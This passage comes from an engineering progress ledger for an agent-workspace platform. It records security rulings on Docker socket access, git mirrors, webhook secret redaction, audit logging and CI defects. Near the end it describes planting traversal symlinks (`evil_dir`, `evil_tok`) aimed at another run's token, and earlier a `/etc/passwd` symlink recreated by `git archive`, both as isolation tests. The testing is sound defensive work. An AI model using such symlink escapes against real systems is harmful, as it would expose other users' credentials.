builds `createGitVaultSource` beside the filesystem adapter: `git rev-parse`, `git ls-tree -r -z`, one
`git cat-file --batch`, **no working tree ever**, the application-ring port unchanged. The bare repo is
the **platform's own** mirror, cloned and fetched by the platform process under a new
`APP_KNOWLEDGE_MIRROR_ROOT`, named by `mirrorCacheKeyFor(projectId)`, fetched with the project's existing
git-binding credential through WP-15a's loader as a credential-helper env. It must **never** read the
launcher's `repo-cache`, never construct a Docker client or helper container (TD-021's WP-15g amendment,
held by `apps/launcher/src/docker-access.test.ts`), never read the task branch (BD-025 — an explicit sha
must pass `git merge-base --is-ancestor`), never read mode `120000`/`160000` entries, and never default
the mirror root (rules 31/18: unset composes no source and the job refuses by name).

**Why not the others, in the ruling's words.** (c) is refused on **freshness, not mechanics**:
`updateMirror` runs a helper container, so the platform cannot advance that mirror; it refreshes before
each *run*, so the after-merge trigger would read a tree without the merge commit and report `unchanged`
— a stale index indistinguishable from a current one — and on a project's first task the mirror does not
exist yet. (b) is refused on surface and cost: `GitProviderPort` has no file read and no tree listing, and
`repoPaths` alone is a full recursive listing per trigger through `IntegrationActionExecutor`. The price
of (a): a second copy per project and `git` in the platform image (**WP-22** owns image and volume); the
mirror carries no credential either way. **Not covered**: the code map — `ctags` needs files, and TD-026
§12 gives it `git archive` from the same mirror, dropping escaping symlinks.

**Measured with plain git 2.50.1, no test target** (rule 66): a mirror of this repository answers
`repoPaths` with 962 entries in 19 ms; all four indexed path classes read by sha from `ls-tree` on a
synthetic vault; a symlink blob returns the target string and a gitlink has no blob; `cat-file --batch`
frames by byte length and says `missing`; the ancestry guard exits non-zero for a side branch; a
read-only mirror serves all three reads; `git archive` recreates a `/etc/passwd` symlink, which is why
the code-map path drops escaping symlinks. **Still needs measurement**: `uploadpack.allowFilter` for
blobless clones, fetch cost against a real remote, concurrent fetches.

### Architect ruling (WP-15g) — "only component" is a deployment boundary, and the default was the thing the decision forbids

**Asked before WP-15g composed the agent runner**, because a refiner scoping the row found that composing the
launcher inside `apps/server` would contradict TD-021's *"only component that can reach the Docker socket"* —
and Q52 had already ruled *"compose it in-process for now"*, which reads like permission until you notice it
means *the launcher's own process rather than an RPC*.

**Ruling: no.** WP-15g composes the **runner half** only and does not build a Docker client into
`apps/server`. It does not need one: **TD-025 §2 already gives the runner a socket-free path to the
container**. `packages/application/src/ports/workspace.ts:182-188` documents `WorkspaceAttachment` as *"the
control channel, from the runner's side of the volume (TD-025 §2)… a path in the runner process' own
filesystem"*, and its three fields derive from `controlRoot` + `runId` + a token file. The **only** part of
`DockerWorkspaceProvider.attach` that touches the daemon is an `inspectContainer` liveness probe
(`packages/infrastructure/src/workspace/provider.ts:721-722`) — and **the connect is a better liveness check
than an inspect that races it**. So `attach` becomes local, the launcher-side calls stay launcher-side, and
**the second half of Q52 is settled**: `WorkspaceProvider` is not one interface with a remote implementation.

**It corrected the orchestrator's framing twice, and the second correction is a live defect.**

1. **There is no `ROLE=launcher`.** `apps/server/src/role.ts:22` is `all | api | worker | runner | indexer`;
   TD-021's own line 8 and `.env.example`'s launcher section both said otherwise. So TD-021 **cannot** be
   satisfied "by deployment via a ROLE", which was the orchestrator's hopeful reading — and `ROLE=all` is the
   **shipped default**, which would put the Docker socket beside the platform's only unauthenticated
   endpoint. Also `capabilities.runner` **gates nothing**: `apps/server/src/runtime.ts` reads only
   `capabilities.api`/`capabilities.worker`, the pipeline is composed under `worker` (`:195`, `:251`), and
   `roleIsIdle('runner')` is `true`.
2. **A rule-55-shaped default is in the tree today.** `parseDockerHost(undefined)` returns
   `/var/run/docker.sock` (`apps/launcher/src/config.ts:79`), reproduced from `readLauncherConfig({})` with
   nothing set. *Absence of configuration grants the unfiltered daemon that TD-021 deploys a proxy to
   remove.* That is rule **55**'s shape — a guard whose default is the thing it exists to prevent — and rule
   **18**'s: an unset value must not produce the permissive result. **`DOCKER_HOST` absent must be a startup
   error.**

**What positively enforces the property, which is the part worth copying.** Asked to rank arrangements by
what survives an RCE in the API process, it ranked: **separate container** (the only one that preserves blast
radius) · separate process (only if the OS denies the socket to that uid — nothing does) · separate `ROLE`
(nothing; `ROLE=all` is the default) · separate **package** (nothing at runtime — `DockerEngine` is already
reachable through `@platform/infrastructure`, which `apps/server/package.json:25` depends on). The amendment
therefore **requires the container**, and what WP-15g can add *now* is a test read **off disk** — the shape of
`delivery-key-redaction.test.ts` — asserting `workspace.DockerEngine` is constructed in **exactly one** file
and `DOCKER_HOST` read in **exactly one**, both under `apps/launcher/src/`. **A claim about this repository's
own sources rather than a hope about a deployment** (rule 55: a deny-list is a claim about the platform's
layout, not about intent).

**Applied**: TD-021 carries the amendment, `.env.example`'s launcher section is corrected. Docs before code,
so both landed before WP-15g's implementer was briefed.

### Architect ruling (WP-15c) — the inbound delivery key, and the column nobody was looking at

**Asked before WP-15c wrote its first `delivery_id`**, because backlog entry 0 named WP-15c as the work
package that owes the answer. Three candidates were on the table: (a) keep the adapter's redacted plaintext
key with its stated collision residual, (b) a one-way digest, (c) something else.

**Ruling: (a). The digest is closed, not deferred.** The reasoning that decides it is *not* the residual's
reachability, which is where I expected the argument to be. It is that **the two candidates are conditional
on different things**: (a)'s safety property — no injected secret in stored state — is a **post-condition of
the redactor**, so it holds on every binding unconditionally, and only *distinctness* is conditional, on
delivery **content**, and a violation additionally requires the platform's own credential to be verbatim in
provider text already. (b)'s weakness is conditional on **deployment configuration an operator cannot see**.
A property that holds on some bindings and silently weakens on others was the stated objection to (b) — the
ruling checked whether (a) had the same defect and found it does not.

**It corrected the ledger twice, which is why it was worth asking.** `APP_SECRET_KEY` is **unplumbed, not
unavailable** — `apps/server/src/config.ts:353` reads it and `apps/server/src/pipeline.ts:269` already calls
`deriveSecretKey(options.secretKey)` — so "a keyed digest is unavailable" was false and is struck; what
survives against (b) is operability (an opaque id in a table technical/03 calls *"dedup **and raw audit**"*)
and **rotation coupling**, since `APP_SECRET_KEY` also wraps `secrets`, so rotating it would silently
un-match every stored `delivery_id`. And the residual is **unreachable on both shipped providers** by charset
and vendor-generation, which is a stronger statement than "no instance on disk" and should be written that
way.

**The finding the question was not about, and the reason this ruling earns its place.** *"This question was
spent on the one column already guaranteed clean."* `inbox(headers, payload)` has existed since
`0005_events.sql:113`, **TD-012's write list does not name `inbox`**, and technical/06 says the row *"stores
the raw payload (audit)"* — while **GitLab's legacy scheme sends the binding's webhook secret as plaintext in
`X-Gitlab-Token`**. An ingress that stores the raw delivery therefore writes a live credential to the
database on **every** delivery, with no attacker and nothing planted. Also: **`inbox` has no
`redaction_count` column**, which WP-15c's plan row requires — it owes migration **0014**.

**What the `inbox` row stores.** `delivery_id` = the port's redacted key verbatim. `headers` and `payload` =
`redactor.redactJson(...)` of the raw delivery, applied **after** `verify` and **after** the key is computed.
`redaction_count` = the summed count over all three redactions on the row — **not** the key's alone, which is
~always 0 and therefore a dead signal. Stated cost: a redacted `payload` can no longer be re-verified against
its signature, so the verdict must be persisted rather than recomputed.

**The accepted failure mode, in the ledger's form.** *When* a binding's own credential appears verbatim in a
delivery's keyed fields and a later, genuinely different delivery differs only inside it, *the platform*
stores one `delivery_id`, keeps the first and drops the second without a trace, *and that is the cost* —
narrower than the harm of failing closed. Rule 20 is not overturned.

**What must be asserted, or the ruling is only recorded.** `delivery-key-redaction.test.ts` stays
**unchanged**; `expect(key).toContain(MARKER)` is what makes it non-vacuous permanently, because it fails
both when an adapter forgets to redact and when a new provider keys a field its recipe does not plant into,
while the two `not.toContain` halves are satisfied by *any* digest — including one over the empty string,
which is exactly what (b) would have deleted. **Added**: an integration assertion that a GitLab
**legacy-token** delivery's stored `inbox.headers` does not contain `webhook_secret_token` and that the row's
`redaction_count >= 1` — a live invariant, where a key-only count would read 0 for ever.

### WP-15g — the agent is composed, and what composing it found

**What is composed where.** `apps/server/src/agent.ts` is the production `ClaudeRunner`:
`composeAgentRunner` builds `createWorkspaceClaudeRunner` over `createClaudeRunner` with the
production transcript sink, an unattended approvals port and a **per-run** TD-012 step-1 redactor,
and `pipeline.ts` registers it. It is **configuration-conditional** (Q59(b)): the two things it needs
are a `RunWorkspaceProvisioner` and, in `api` mode, `ANTHROPIC_API_KEY`; absent, the process composes
`unavailableClaudeRunner` and `runtime.ts` logs the **named** list of what is missing. No production
path supplies a provisioner, because that needs the `platform-launcher` container (Q52's transport)
and **TD-021's amendment forbids this process from holding a Docker client instead** — enforced off
disk by `apps/launcher/src/docker-access.test.ts`.

**Three of the four missing collaborators are built; the fourth is a refusal by name.**
`createPostgresTranscriptSink` (the first thing in this repository to write `run_messages`),
`buildWorkspaceSpec` (the first production `WorkspaceSpec`), the per-run injected-secret redactor —
and `unattendedToolApprovals`, which **denies** with a reason the model is shown, because BD-025's
unattended default is deny and this build has nowhere to ask (the Question surface is unbuilt).

**Decisions and assumptions, each of which a reviewer should be able to disagree with.**

1. **`WorkspaceProvider.attach` stays on the provider.** TD-021's amendment says the runner obtains
   the attachment *locally*; the honest reading in this build is that it obtains it from the launcher
   that created the run and then touches no daemon — which is what the provisioner shape gives. A
   `readLocalAttachment(controlRoot, runId)` for a **split** deployment was deliberately not written:
   it would have no caller until Q52's transport exists, and a collaborator with no caller is the
   shape standing rule 31 is about. The contract case *"refuses to attach after the workspace has been
   killed"* also depends on the daemon probe, so removing it needed a replacement nobody asked for.
2. **`attach` now waits for the control socket, and that closed a live defect.** Measured by the new
   check before it existed: `create` returns when the container has *started*, the shim then boots
   Node and `listen()`s, and a runner that connects immediately gets `connect ENOENT` on a healthy
   workspace, 8 ms in, reported as `Failed to spawn Claude Code process`. **The consequence, sized
   honestly** (review round 1 corrected an overstatement here): with Q59(a) in place each occurrence
   costs **one failed `runs` row and one 30 s retry per task**, absorbed by the bounded start retry —
   not a lost task. Without the wait *and* without Q59(a) it would have been the first run of every
   task. The wait is a filesystem poll on the volume the launcher already mounts (30 s bound, 50 ms
   poll), it throws `workspace_failed` — which `classifyProvisionFailure` calls **retryable** — and it
   is what makes the ruling's *"the connect is a better liveness check than an inspect that races it"*
   true rather than aspirational. **Both directions are asserted**, which round 1 found they were not:
   shortening the loop to one look left 37/37 green, so
   `packages/infrastructure/src/workspace/provider.test.ts` › *"waits for a shim that starts listening
   after attach was called"* now drives a shim that boots **late**, and that mutant dies by name
   (calibrated: unmutated 38/38).
3. **`buildWorkspaceSpec` lives in `packages/infrastructure/src/workspace/`, not in `application`.**
   Its input is a `RunSpec` and the one `RunSpec` fixture this repository has is in infrastructure, so
   putting the pure function in the application ring would have meant a second fixture — the drift the
   first one exists to prevent. Nothing in `application` calls it; every caller is a composition root.
4. **BD-025's narrow-never-widen rule holds by construction, and that is filed as Q62.** There is no
   workspace section in `.agentic/config.yml`, so a project can say nothing about limits, runtime,
   egress, retention or `readOnly`; a merge function nothing feeds would be untested. Q62 asks whether
   to keep it that way and names the two fields that would be safe to make project-narrowable.
5. **`ROLE=runner` is a worker** (criterion 7). The flag it used to set gated nothing, and gating the
   agent runner on a **role** would be a lottery: pg-boss hands `stage.execute` to any subscribed
   worker, so `ROLE=worker` beside `ROLE=runner` would give half the agent stages to a process that
   composes no runner. Whether a process runs agents is therefore decided by configuration and never
   by `ROLE`. The `runner` capability flag is deleted rather than left decorative; `ROLE=runner` is no
   longer idle, so it now also gets the worker's pool floor, which is a correctness gain.
6. **Migration 0016.** `run_messages` shipped `check (seq >= 1)` at WP-06 against a producer whose
   first entry is `seq: 0`; nothing found out for ten work packages because nothing wrote a row. The
   contracts and the producer win, the constraint becomes `>= 0`, and the alternative (translating at
   the sink) is rejected in the migration's own text because it would make the stored `seq` and the
   SSE cursor for one entry differ by one.
7. **Q59(a)'s bound**: `MAX_RUN_START_ATTEMPTS = 3` at `RUN_START_RETRY_MS = 30_000`, carried in the
   `stage.execute` payload as `start_attempts` the way `gate_checks` already rides one — because the
   process that retries may not be the one that failed. A retryable failure **fails the run it
   created** and leaves the task untouched, so a flap costs one visible `runs` row and never a row left
   `running`.
8. **The prompt measurement the row asked for, and it corrected the guess.** With
   `@anthropic-ai/claude-agent-sdk@0.3.267` **both** halves travel on **stdin** and neither is in argv:
   the user prompt as `{"type":"user",…}` frames, and `systemPromptAppend` inside the `initialize`
   *control request* as `request.appendSystemPrompt`. The argv carries only options
   (`--output-format`, `--model`, `--json-schema`, `--tools`, `--managed-settings`). Both directions
   are asserted, because a later reader looking for the role prompt in argv would find nothing and
   conclude the prompt was empty.

**Two platform measurements that decided the shape of criterion 2's check**, and neither is a product
defect: (a) a Unix socket created inside the Docker VM **cannot be connected to from a macOS host** —
the host `stat`s the socket on a bind-backed volume and gets `ECONNREFUSED`; (b) the run shim
**refuses to start** on a bind-backed control volume, because it `chmod 0600`s its socket after binding
and `chmod` on a socket there answers `EINVAL` (`ws-<run>` exited 1 with
`EINVAL: invalid argument, chmod '/ctl/ctl.sock'`). The refusal is correct — a socket whose mode the
platform could not set is a socket whose access control it cannot state — so the *harness* changed:
`startDockerFixture({ controlVolumeBind: false })` makes a plain named volume, and
`scripts/runlet-launcher-check.mjs` runs the launcher **and** the runner inside one container
(`runlet-launcher-inner.mjs`), which is TD-021's own deployment and Q52's "compose it in-process for
now". Verdict on this machine: `PASS: runlet-launcher-check (7/7 checks)`.

**Verdicts, from the final tree.** `PASS: verify` (4606 passed | 14 skipped), `PASS: verify:integration`
(215), `PASS: verify:e2e` (83), `PASS: verify:ui` (245), `PASS: verify:web-e2e` (33), and
`PASS: runlet-launcher-check (7/7 checks)` — the last one is not a `verify` target and needs
`DOCKER_HOST` and a daemon. `verify:commits` has nothing to check: the implementer made no commit.

**Stale sentences this work package falsified and could not fix itself** (standing rule 83 — the
implementer may not edit `CLAUDE.md`, and the Resume note is the orchestrator's):

- `CLAUDE.md:115` — *"One collaborator still has no production adapter — a `ClaudeRunner` (no launcher
  transport, Q52) — so `startRuntime` composes `unavailableClaudeRunner`, which **throws**"*. The
  adapter exists; what is absent is the **provisioner**, and the refusal is now conditional on
  configuration. The same paragraph should name `apps/server/src/agent.ts` and
  `docker-access.test.ts`.
- The **Resume note** (`:20`, `:37`) — *"In production `unavailableClaudeRunner()` **throws**"* is still
  true of a process with no launcher configuration and false as a statement about the build; and
  *"Next, in order. (1) A row for Q52"* is done.
- `PROGRESS:3915` — *"**`ClaudeRunner`** needs a workspace, and the runner→launcher transport is
  **Q52**, deliberately unbuilt"* is now only the transport half.
- Backlog **24** (`:2001`, `:2034`) — *"the pipeline composes no `WorkspaceProvider`"*: WP-14a's third
  tier can now be reached through the same provisioner seam the e2e uses, without Q52.

## Discovered work (not in plan)
- **The SSE half of the transcript is not composed** (WP-15g). `RunTranscriptSink`'s docblock says an
  entry goes to `run_messages` *plus* the `run:<id>` SSE topic; nothing bridges that topic to `SseHub`
  and nothing reads the rows back. It cannot be a `NOTIFY` payload — broadcasts are capped at 7 000
  bytes and carry hints — so it has to be a read-back from the rows WP-15g finally writes, and it needs
  a read API `apps/server/src/queries/` does not have. Belongs with the work package that renders a
  live run.
- **`run_messages.blob_id` is never set: a payload over 1 MB is stored whole** (WP-15g). technical/03
  says payloads over 1 MB go to `blobs`; the sink writes the document as-is. It is bounded in practice
  by `toolOutputMaxChars` (10 000 characters head and tail per tool result) and by the SDK's own
  message sizes, so it is a gap rather than a leak — but a single very large assistant message would
  land in one row.
- **A launcher built from the environment cannot set the egress sidecar's command** (WP-15g).
  `WorkspaceImages.egressCommand` exists on the provider and `readLauncherConfig` has no variable for
  it, so a launcher built from env starts the sidecar with the image's default `CMD`. Correct for
  WP-22's real `platform-egress` (tinyproxy's entrypoint is the proxy) and wrong for any stand-in
  image, which exits immediately and leaves the workspace with `HTTPS_PROXY` pointing at a dead
  container. Found while writing `runlet-launcher-check.mjs`, which does not depend on the sidecar.
- **The 14-day retention for a paused or taken-over workspace is never applied** (WP-15g).
  `buildWorkspaceSpec` sets `keepUntil` to three days because at create time nothing knows how the
  task will end, and nothing extends it afterwards — technical/05 §5's "14 days for paused/taken-over"
  is unimplemented. It belongs with the export/take-over path, which is where the other half of the
  sentence lives.

- **A one-way digest for the inbound delivery key.** Round 4 reconciled the redact-vs-refuse split and
  filed the option that has neither cost: hash the key instead of redacting it, so distinctness survives and
  no secret is stored. Needs a digest key an `InboundNormaliser` does not hold today (the binding's webhook
  secret is `string | null` on GitLab; `APP_SECRET_KEY` is not plumbed to a registration), a replacement for
  `delivery-key-redaction.test.ts`'s instrument (a digest makes its present assertion vacuous), and a
  decision on an opaque `delivery_id` in a table technical/03 calls "dedup and raw audit". The reasoning and
  the measurement are on `InboundNormaliser.deliveryKey`.
- **`emitted-secrets.test.ts` covers Jira and GitLab only.** Its member enumeration is derived
  (`Object.keys(port)`) but its provider list is not, and Slack's unredacted dedup key is exactly what that
  gap hid. Slack, Sentry and Loki owe the same walk — every string they emit, planted, through the real
  registration with the caller disarmed. Sizeable: the GitLab section alone is ~240 lines.
- **A run's `structuredOutput` reaches `artifacts.data` unredacted — TD-012 names artifacts explicitly.**
  `claude-runner.ts` keeps the raw `SDKResultMessage` (`result = message`) and returns
  `structuredOutput: validated.data` off it, while the transcript copy of the *same message* is redacted in
  `append` and every sibling on the same outcome object (`error`, stderr) is redacted too. `stage-executor.ts`
  then writes it to `artifacts.data`, turns it into `questions.text`, and `saga.ts` copies the MR url, branch
  and head sha out of the artifact onto the `tasks` row. Model output is untrusted (BD-022) and TD-012 lists
  "artifacts" among the writes redaction must precede. It is the same class as the four closed on this branch
  and belongs to WP-12/WP-15, not here. The design question to answer first is the one `IdempotencyPlan` now
  states: an artifact field that is redacted is an artifact field the pipeline may branch on — a head sha or
  a URL — so "redact the artifact" is not obviously the right shape, and the redactor to use is the run's.
- **`handler_executions.error` and `event_dispatch.error` take a handler's raw message.**
  `event-bus.ts`'s `describeError` writes `${error.name}: ${error.message}` to both columns with no redactor.
  Everything `IntegrationActionExecutor` throws is already scrubbed (that is the point of its single `catch`),
  so the integration path is covered; a handler that throws provider text it obtained any other way is not.
  TD-012's enumeration does not name these two columns, which is itself worth deciding.
- **`HealthProbe.detail` has the same shape as the dedup key and no mechanical check.** It is provider text
  bound for `integrations.health`, the obligation is stated on `healthProbeSchema` and discharged by Jira's
  contract test alone; `delivery-key-redaction.test.ts` is the template — every provider directory, real
  registration, caller disarmed, credential planted. Nothing writes the column yet, so it is a gap and not
  a leak.
- **The three fakes' `fakeDeliveryKey` takes no redactor, and the fakes accept none.** A fake that does not
  redact where the real adapter does is *kinder* than production, which is standing rule 1's forbidden
  direction, and every later WP's unit tier trusts the fakes. Either give the fakes a redactor or record
  the divergence explicitly in each fake's register; today it is neither.

- **`pnpm nul:check` cannot see a NUL in a file that is not yet tracked, and WP-16 produced two.** Its
  scope is `git ls-files` (CLAUDE.md says so), so a **new** source file carrying a literal NUL passes
  `verify` until it is staged. WP-16 wrote literal NULs into two brand-new files — `knowledge/globs.ts`,
  where a NUL is the *right* sentinel and CLAUDE.md asks for the escape `\0`, and `kb-search.test.ts`,
  where a single space was meant — while `nul:check` reported
  `PASS: nul:check (832 tracked text files, …, none with a NUL byte)`. The first was found by **luck**:
  biome rendered the character in a formatting diff. The second was found by `nul:check` itself, in the
  second after `git add`, which is the guard working exactly as designed. So the gap is real and narrow:
  untracked files are invisible, and the window closes at `git add` — before the pre-commit hook, before
  any push. Worth noting rather than rushing: closing it means walking `git ls-files --others
  --exclude-standard` as well, which is one flag plus a decision about whether a guard should read files
  git has been told to ignore. **The transferable part is not the guard.** An agent editing through a tool
  can emit a byte it did not intend and cannot see in its own output — twice in one work package, in two
  files, where a space was meant. Rule 30 says a lesson in prose does not prevent recurrence; here the
  check existed and its *scope* was the hole.
- **Nothing composes a `PlatformToolPort` in production, so `kb_search` has no home yet.** WP-12 defined the
  port and its nine methods; the only implementations in the tree are `recordingTools` (a fixture) and
  WP-16's `createKbSearchTool`, which is a function a composition root would supply. The MCP wiring
  (`platform-mcp.ts`) is ready and takes a `PlatformToolPort`; what is missing is the root that builds one.
  Belongs with WP-17, which owns prompt assembly and therefore the run's tool surface.
- **The `KnowledgeIndexer` is not registered as a pg-boss job.** technical/07 specifies "singleton per
  project", triggered at task start and after every merge. WP-16 ships the indexer and its `VaultSource`,
  and registering the job needs a checkout to read — which needs the workspace provider, which needs the
  webhook ingress that backlog entry 1 says does not exist. Wiring it before then would be a job nothing can
  trigger.

### WP-14 round 3 — the guard against unresolvable citations could not read its own repository

Round 2 answered rule 11 with a parser: every `` `file.test.ts` `` › `"name"` in a tracked source is
resolved against the file it names. It shipped **red**, and for a reason worth keeping: its own examples
cited the bare basename `fake.test.ts`, which six tracked files answer to, so the sweep reported four
ambiguous citations — in the author's own file. That is standing rule 59, and round 2's report on top of it
said "verify PASS (3405)" — a true test *count* read out of a failing run, now rule 61. Both example sites
are real citations of real tests, resolved like any other; nothing was excluded from the sweep to make it
green, because the author's own file is where the guard has to work.

The deeper defect was recall. The parser was line-scoped and this repository wraps its prose at 100
columns, so **both** citations in `workspace/provider.ts` — under a sentence claiming they were "resolved
mechanically" — were invisible to it. The reviewer proved it by planting three citations and watching only
the single-line fabrication get reported (standing rule 58: rule 44's shape *inside* the fix for rule 11,
and rule 48's corollary — **plant the spelling the repository actually writes, not the one the grammar
section shows**). Three changes, each mutation-checked:

- a **logical line**: a line continues onto the next only when it stops part-way through a citation —
  inside an unclosed `"name`, straight after the `›`, or after the comma of a list. A *complete* citation
  does not continue, so quoted prose on the next line is still not swallowed (asserted from both sides).
  Which decorations may continue one is the caller's choice, `'comment'` (`*`, `//`) or `'prose'` (none,
  as Markdown wraps).
- a **recall check**: `citationSites` finds every place a citation opens, by a second expression of that
  shape, and every site must have produced a citation. It replaces `MINIMUM_CITATIONS = 10` against an
  actual 21 — a floor one docblock cleared by itself. Measured now: 18 sites, 24 citations, 0 unread.
  Planting a wrapped fabrication in `provider.ts` now reports it (`provider.ts:37 cites … — no such
  test`); mutating the wrap logic to a no-op fails four tests including the recall check; mutating the
  site regex to match nothing fails its calibration and the floor.
- **Markdown in scope** (`.md` alongside `.ts`/`.tsx`/`.mjs`), because `CLAUDE.md`, `PROGRESS.md` and
  `docs/technical/*` are where this class of claim also lives. Zero citations exist there today, so it is
  a guard waiting rather than a guard working — demonstrated by planting a wrapped one in `docs/TODO.md`
  and watching the sweep name it.

Also round 3: `startRun`'s failed-start path revoked the run credential with `.catch(() => undefined)`,
one line above a teardown that logs its own failure. A revoke that fails there leaves a **run-scoped git
push token live for its whole TTL** (a day, TD-021's default) on a run that never started, with `endRun`
unable to try again — it needs a handle that path never returns. It now warns like its neighbours, and the
test asserts both halves: the warning, and that the caller still sees the failure that ended the start.

**Assumptions recorded:** (1) the wrapped-citation grammar admits exactly the three "stops mid-citation"
shapes above — a fourth (a name broken across a fenced block, say) is listed in the parser's docblock as a
known gap rather than guessed at; (2) two citations of the *same* file on one line are one site to the
recall check, also stated there; (3) markdown continuation ignores list and heading structure, which is
sound while no Markdown citation exists and is the reason the limit is written down.

### ci-fix — six pushes onto a red gate, and three environment defects stacked behind one error

**What was wrong, and why nobody saw it.** `e2e-fake-claude` had been red since WP-14's own merge
(`34509491314`), six consecutive runs, every other job green — and the ledger said "main is green on all five
targets" the whole time, because five *local* targets were being read as the state of `main` and
`gh run list` was never run (rule 69). One error message hid **three** independent defects, each only
visible once the one in front of it was gone (rule 71):

1. **`mkdir: can't create directory '/ctl/<uuid>': Permission denied`.** The prep helper is root with
   `CapDrop: ALL` and only `CAP_CHOWN` — **no `CAP_DAC_OVERRIDE`** — so it is an ordinary non-owner subject
   to mode bits. The *e2e's* control volume is bind-backed onto a host `mkdtemp` (`0700`, owned by the
   runner), where production's is a `root:root 0755` named volume the helper owns as uid 0. So the `mkdir`
   half is a **fixture** defect, confirmed both ways: prep identity into a named-volume root → `PREP_OK`;
   into `1001:1001 0700` → the CI error verbatim. macOS hid it because a bind mount reports `0 0` for a host
   directory owned by uid 501, so the helper always *appeared* to own it.
2. **`Docker engine answered 404`, 21 tests and a whole suite.** `POST /containers/create` with an absent
   image answers 404 `No such image`, and **a create through the engine API never pulls**. `RUNTIME_IMAGE`
   was handed straight to the provider and *assumed*; `ALPINE_IMAGE` and `GIT_IMAGE` reached the daemon
   through the **CLI**, which pulls — luck, not design. A clean daemon has none of them.
3. **`nslookup egress-<run>` exiting 1** — **a broken probe, not a broken platform**, settled by a
   differential varying only `--dns-search`: no search domain → `nslookup rc=0`; one → `nslookup rc=1` while
   `getent hosts` still returns the address. Busybox `nslookup` also queries `<name>.<search-domain>`, the
   embedded resolver must forward that upstream, and an internal network has no route upstream. A developer
   machine has no `search` line; a cloud runner's host does and Docker copies it in. Rule 56's second
   instance: the false branch meant "did not resolve **or** some other query in the same process did not".
   The assertion now uses `getent hosts` and asserts the **address**. `docs/research/12-run-shim-verification.md`
   check 3 is where the unsound instrument came from and was amended; its conclusion was right.

**The product defect, found one layer down (rule 4).** `#removeControlDirectory` ran as root with no
capabilities against a directory `#prepare` had chowned to uid 1000 — so `rm -rf` exited 1 and **a run's
token stayed on the shared control volume**, surfaced only as `teardown partial`. Three rounds on the fix:
the reviewer's prescribed `chown -R` **does not work** (it must open a directory to walk it — rule 27's
sixth instance); `CAP_DAC_OVERRIDE` + `chmod -R u+rwX` + `rm -rf` does, on both volume shapes; and then the
capability turned out to be **unnecessary** — the shipped form is **two zero-capability containers**,
`ctlempty` (uid 1000, unlock and empty, leave `0755`) then `ctlrm` (uid 0, unlink), measured rc 0 and empty
in all six cells of {named, bind-backed} × {benign, locked, already gone}. The final `chmod 755` is
load-bearing: without it step 2 exits 1 on a named volume.

**Two review findings inside the security census itself**, both measured: its `CapDrop` half read an absent
value with `?? ['ALL']`, so a container emitting **no** `CapDrop` — Docker's full default set, the worst case
it exists to catch — **passed** (rule 18 inside a security check); and its "a helper added later is covered
the day it is added" was false, because it drove one create+destroy while `export` and `updateMirror` create
helpers on paths it never took (`capAdd: ['SYS_ADMIN']` on the export helper left 171/171 green). Driving all
four methods immediately surfaced a helper role nobody had enumerated (`egresscfg`) — rule 68 paying for
itself on the day it was applied.

**Verdicts.** First green CI since WP-14: run **`34580312845`** at `8475c32`, then **`34582432776`** at
`0223a77`, all eleven jobs both times. Locally at `0223a77`: `PASS: verify`, `PASS: verify:e2e`,
`PASS: verify:integration`. **No cross-run escalation exists** under either design — measured with an agent
planting `evil_dir → ../runB` and `evil_tok → ../runB/token`: runB left `500`, its token `400`, contents
intact, and `rm -rf` unlinked the link rather than the target.

### WP-15b — the audit log, and the foreign key that made the audit fail the action

**The acceptance criterion, answered.** `startRuntime()` with no options — the call `main.ts:18` and
`scripts/dev.mjs` make — composes the pipeline, builds a PostgreSQL `IntegrationAuditLog` and
`IdempotencyStore` from its own pool, and `/readyz` reads **200** on `ROLE=all` with
`checks.dispatch: ok`. `test/e2e/pipeline/composition.e2e.test.ts` › *"reports /readyz ok on ROLE=all,
dispatch check included"* asserts it against an instance started exactly as the auth and SSE e2e files
start theirs, and the pipeline e2e asserts the **rows** (`integration_actions`) with **no** audit log
supplied by anything: `PipelineComposition` no longer has the field, so rule 35's "supplied, not used"
escape is closed by the type rather than by a promise.

**Migration `0013_integration_audit.sql`** adds `project_id`, `redaction_count` and `attempts`, and
creates `integration_idempotency`. Two decisions inside it are worth more than the columns:

- **`redaction_count` and `attempts` are `not null` with the default dropped immediately.** The default
  exists only because PostgreSQL needs one to add a NOT NULL column; dropping it makes an INSERT that
  forgets the column an error rather than a recorded zero, so "nobody wrote the column" and "nothing was
  redacted" stop being spelled the same way (rule 18). Named test:
  `test/integration/integrations/audit-log.integration.test.ts` › *"refuses a row that omits
  redaction_count, because the migration dropped the default"*.
- **`integration_actions_task_id_fkey` is dropped and `project_id` gets no foreign key.** This was a
  measurement, not a preference: with the constraint in place **every** e2e died on its first event at
  `insert or update on table "integration_actions_2026_09" violates foreign key constraint
  "integration_actions_task_id_fkey"`. The audit row commits in a transaction of its own (with its event,
  per BD-003) while the caller is still inside one — `saga.ts`'s intake handler reads the repository's
  default branch *after* `store.tasks.insert` on the same scope, and technical/06 says outbound actions
  are triggered by event handlers generally. So the constraint refuses the audit **because the caller has
  not committed**, making the audit the thing that fails the action. The residual is stated in the SQL and
  in technical/03: a `task_id` may name a task that no longer exists or that a rolled-back transaction
  never created, which is still the honest record, because the provider call happened outside any
  transaction and really was made. `integration_id` keeps its key: a binding is always committed first.
  Named test: *"records an action for a task the audit cannot see, because 0013 dropped the foreign key"*.

**`redaction_count` in both directions, through the real executor** (rule 42, and the row's own words).
`test/integration/integrations/audit-log.integration.test.ts`: the same payload, the same action, two
redactors. *"records a non-zero count, and no credential, when the redactor holds the secret"* and
*"records zero when the redactor was told nothing — and the credential is in the row"* — the second
reads the planted credential back out of `integration_actions.payload` and asserts the count is `0`,
because that zero beside a payload that plainly carries a token is the **only** signal an auditor gets
that TD-012 did not fire. The shared contract suite asserts the same pair against both implementations.

**The stream-sequence question the row flagged, answered with the precedent rather than a new mechanism.**
`NormalisedEvent` stops at `{type, payload, actor}`, so the adapter supplies the envelope: stream
`integration` / `integrations.id`, `correlation_id` the task (technical/03's stated purpose for that
field), sequence from `EventStore.nextStreamSequence` read **before** the transaction — which is exactly
what `knowledge/indexer.ts` (WP-16) already does. What is new is the **retry**: a `StreamConflictError`
re-reads and retries up to four times, because two outbound calls on one integration really do race and
without it the audit would be what failed the action. `would_have` and `replayed` read no sequence at all.
The first version of the integration test for this raced two `record` calls with `Promise.all` and
**passed with the retry deleted** — they do not race, the second reads its sequence after the first
commits — so it was replaced by a staged loss that hits migration 0005's real trigger. Rule 3, caught by
mutating rather than by reading.

**Two changes that are consequences, named so they are not read as scope creep.**
`POOL_RESERVATIONS.pipeline = 2` (every `worker` role now composes the pipeline, so its two job workers
